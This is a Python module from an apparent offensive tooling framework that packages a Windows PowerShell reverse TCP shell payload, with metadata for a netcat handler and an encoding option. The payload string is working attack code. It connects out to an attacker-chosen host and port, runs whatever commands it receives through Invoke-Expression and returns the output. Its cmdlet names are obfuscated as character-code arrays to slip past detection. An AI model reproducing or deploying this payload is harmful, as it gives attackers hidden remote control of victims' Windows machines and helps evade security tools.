# This module is part of the Shakamura framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = """do {
    & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |ForEach-Object{$_}|%{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$($_)}| % {$_}) -Seconds 15
    try{
        $TCPClient = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$_}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$($_)}) Net.Sockets.TCPClient('*LHOST*', *LPORT*)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $($_))})) |ForEach-Object{$_}|%{$_}| % {$($_)}) IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize |ForEach-Object{$($_)}|%{$($_)}| % {0}
    $StreamWriter.Write($String + 'PS ' + (& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$_})).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {   
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$_}| % {$($_)}) $Command 2>&1 |ForEach-Object{$($_)}|%{$($_)}| & (("xOFCNl5UbI4P1ZM6daqYfrG2hc-zS0AwBvLEmyHuoe38XjgRiQJ9kW7VntpTKDs")[1,39,57,26,28,57,21,48,56,46] -join '')
        } catch {
            $_ |ForEach-Object{$_}|%{$($_)}| & (("xOFCNl5UbI4P1ZM6daqYfrG2hc-zS0AwBvLEmyHuoe38XjgRiQJ9kW7VntpTKDs")[1,39,57,26,28,57,21,48,56,46] -join '')
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()"""
    
